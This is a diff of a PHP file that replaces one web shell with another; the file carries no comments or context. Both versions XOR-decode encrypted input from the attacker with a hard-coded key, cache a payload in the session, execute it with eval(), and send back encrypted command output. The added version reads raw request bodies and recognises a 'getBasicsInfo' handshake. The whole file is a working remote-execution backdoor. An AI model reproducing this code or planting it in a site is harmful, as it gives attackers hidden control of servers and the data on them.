@@ -1,34 +1,26 @@
 <?php
-    session_start();
-    @set_time_limit(0);
-	@error_reporting(0);
-    function E($D,$K){
-        for($i=0;$i<strlen($D);$i++) {
-            $D[$i] = $D[$i]^$K[$i+1&15];
-        }
-        return $D;
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
     }
-    function Q($D){
-        return base64_encode($D);
-    }
-    function O($D){
-        return base64_decode($D);
-    }
-    $P='Bcs';
-    $V='payload';
-    $T='3c6e0b8a9c15224a';
-    if (isset($_POST[$P])){
-        $F=O(E(O($_POST[$P]),$T));
-        if (isset($_SESSION[$V])){
-            $L=$_SESSION[$V];
-            $A=explode('|',$L);
-            class C{public function nvoke($p) {eval($p."");}}
-            $R=new C();
-			$R->nvoke($A[0]);
-            echo substr(md5($P.$T),0,16);
-            echo Q(E(@run($F),$T));
-            echo substr(md5($P.$T),16);
-        }else{
-            $_SESSION[$V]=$F;
+    return $D;
+}
+$payloadName='payload';
+$key='890f4efd0d951547';
+$data=file_get_contents("php://input");
+if ($data!==false){
+    $data=encode($data,$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+		eval($payload);
+        echo encode(@run($data),$key);
+    }else{
+        if (stripos($data,"getBasicsInfo")!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
         }
     }
+}
